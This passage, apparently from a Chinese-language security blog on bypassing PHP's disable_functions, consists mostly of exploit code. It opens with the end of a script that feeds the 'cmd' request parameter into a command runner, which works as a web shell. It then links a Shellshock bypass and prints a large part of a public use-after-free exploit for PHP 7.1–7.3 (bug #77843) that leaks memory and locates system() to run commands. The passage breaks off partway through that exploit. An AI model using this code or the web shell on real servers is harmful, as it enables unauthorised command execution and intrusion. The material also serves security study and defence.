  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;不满足使用条件&#34;</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// runcmd(&#34;whoami&#34;); // 要执行的命令
</span><span class="c1"></span><span class="nx">runcmd</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span> <span class="c1">// ?cmd=whoami
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><p>或者<a href="https://www.exploit-db.com/exploits/35146" target="_blank" rel="noopener noreffer">PHP &lt; 5.6.2 - &lsquo;Shellshock&rsquo; Safe Mode / disable_functions Bypass / Command Injection - PHP webapps Exploit </a></p>
<h2 id="json-uaf-bypass">JSON UAF Bypass</h2>
<blockquote>
<p>This exploit utilises a use after free <a href="https://bugs.php.net/bug.php?id=77843" target="_blank" rel="noopener noreffer">vulnerability</a> in json serializer in order to bypass <code>disable_functions</code> and execute a system command. It should be fairly reliable and work on all server apis, although that is not guaranteed.</p>
<p><a href="https://bugs.php.net/bug.php?id=77843" target="_blank" rel="noopener noreffer">PHP :: Bug #77843 :: Use after free with json serializer</a></p>
</blockquote>
<p>影响范围：</p>
<ul>
<li>7.1 - all versions to date</li>
<li>7.2 &lt; 7.2.19 (released: 30 May 2019)</li>
<li>7.3 &lt; 7.3.6 (released: 30 May 2019)</li>
</ul>
<p>exp: <a href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php" target="_blank" rel="noopener noreffer">php-json-bypass/exploit.php · mm0r1/exploits</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="nv">$cmd</span> <span class="o">=</span> <span class="s2">&#34;id&#34;</span><span class="p">;</span>

<span class="nv">$n_alloc</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="c1"># increase this value if you get segfaults
</span><span class="c1"></span>
<span class="k">class</span> <span class="nc">MySplFixedArray</span> <span class="k">extends</span> <span class="nx">SplFixedArray</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">static</span> <span class="nv">$leak</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Z</span> <span class="k">implements</span> <span class="nx">JsonSerializable</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">write</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$v</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$v</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
        <span class="nv">$v</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">str2ptr</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$address</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$s</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$address</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
            <span class="nv">$address</span> <span class="o">|=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$str</span><span class="p">[</span><span class="nv">$p</span><span class="o">+</span><span class="nv">$j</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$address</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">ptr2str</span><span class="p">(</span><span class="nv">$ptr</span><span class="p">,</span> <span class="nv">$m</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$m</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$out</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$ptr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
            <span class="nv">$ptr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1"># unable to leak ro segments
</span><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="nf">leak1</span><span class="p">(</span><span class="nv">$addr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$spl1</span><span class="p">;</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="nv">$addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">strlen</span><span class="p">(</span><span class="nx">get_class</span><span class="p">(</span><span class="nv">$spl1</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="c1"># the real deal
</span><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="nf">leak2</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$spl1</span><span class="p">,</span> <span class="nv">$fake_tbl_off</span><span class="p">;</span>

        <span class="c1"># fake reference zval
</span><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="nv">$fake_tbl_off</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">);</span> <span class="c1"># gc_refcounted
</span><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="nv">$fake_tbl_off</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="nv">$addr</span> <span class="o">+</span> <span class="nv">$p</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span> <span class="c1"># zval
</span><span class="c1"></span>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">,</span> <span class="nv">$fake_tbl_off</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span> <span class="c1"># type (string)
</span><span class="c1"></span>
        <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$spl1</span><span class="o">::</span><span class="nv">$leak</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$leak</span> <span class="o">%=</span> <span class="mi">2</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="nv">$s</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>

        <span class="k">return</span> <span class="nv">$leak</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$e_type</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

        <span class="nv">$e_phoff</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>
        <span class="nv">$e_phentsize</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
        <span class="nv">$e_phnum</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$e_phnum</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$header</span> <span class="o">=</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$e_phoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_phentsize</span><span class="p">;</span>
            <span class="nv">$p_type</span>  <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
            <span class="nv">$p_flags</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
            <span class="nv">$p_vaddr</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
            <span class="nv">$p_memsz</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>

            <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_Write
</span><span class="c1"></span>                <span class="c1"># handle pie
</span><span class="c1"></span>                <span class="nv">$data_addr</span> <span class="o">=</span> <span class="nv">$e_type</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">?</span> <span class="nv">$p_vaddr</span> <span class="o">:</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$p_vaddr</span><span class="p">;</span>
                <span class="nv">$data_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_exec
</span><span class="c1"></span>                <span class="nv">$text_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$data_addr</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$text_size</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$data_size</span><span class="p">)</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>

        <span class="k">return</span> <span class="p">[</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">list</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$elf</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$data_size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$leak</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$deref</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
                <span class="c1"># &#39;constant&#39; constant check
</span><span class="c1"></span>                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x746e6174736e6f63</span><span class="p">)</span>
                    <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>

            <span class="nv">$leak</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$deref</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
                <span class="c1"># &#39;bin2hex&#39; constant check
</span><span class="c1"></span>                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x786568326e6962</span><span class="p">)</span>
                    <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>

            <span class="k">return</span> <span class="nv">$data_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$start</span> <span class="o">=</span> <span class="nv">$binary_leak</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$start</span> <span class="o">-</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nv">$i</span><span class="p">;</span>
            <span class="nv">$leak</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">==</span> <span class="mh">0x10102464c457f</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># ELF header
</span><span class="c1"></span>                <span class="k">return</span> <span class="nv">$addr</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$basic_funcs</span><span class="p">;</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="nv">$f_entry</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$addr</span><span class="p">);</span>
            <span class="nv">$f_name</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$f_entry</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

            <span class="k">if</span><span class="p">(</span><span class="nv">$f_name</span> <span class="o">==</span> <span class="mh">0x6d6574737973</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># system
</span><span class="c1"></span>                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">leak2</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$addr</span> <span class="o">+=</span> <span class="mh">0x20</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$f_entry</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">jsonSerialize</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$y</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$spl1</span><span class="p">,</span> <span class="nv">$fake_tbl_off</span><span class="p">,</span> <span class="nv">$n_alloc</span><span class="p">;</span>

        <span class="nv">$contiguous</span> <span class="o">=</span> <span class="p">[];</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n_alloc</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
            <span class="nv">$contiguous</span><span class="p">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DateInterval</span><span class="p">(</span><span class="s1">&#39;PT1S&#39;</span><span class="p">);</span>

        <span class="nv">$room</span> <span class="o">=</span> <span class="p">[];</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n_alloc</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
            <span class="nv">$room</span><span class="p">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Z</span><span class="p">();</span>

        <span class="nv">$_protector</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ptr2str</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">78</span><span class="p">);</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ptr2str</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">79</span><span class="p">);</span>
        <span class="nv">$p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DateInterval</span><span class="p">(</span><span class="s1">&#39;PT1S&#39;</span><span class="p">);</span>

        <span class="nx">unset</span><span class="p">(</span><span class="nv">$y</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="nx">unset</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span>

        <span class="nv">$protector</span> <span class="o">=</span> <span class="s2">&#34;.</span><span class="si">$_protector</span><span class="s2">&#34;</span><span class="p">;</span>

        <span class="nv">$x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DateInterval</span><span class="p">(</span><span class="s1">&#39;PT1S&#39;</span><span class="p">);</span>
        <span class="nv">$x</span><span class="o">-&gt;</span><span class="na">d</span> <span class="o">=</span> <span class="mh">0x2000</span><span class="p">;</span>
        <span class="nv">$x</span><span class="o">-&gt;</span><span class="na">h</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
        <span class="c1"># $this-&gt;abc is now of size 0x2000
</span><span class="c1"></span>
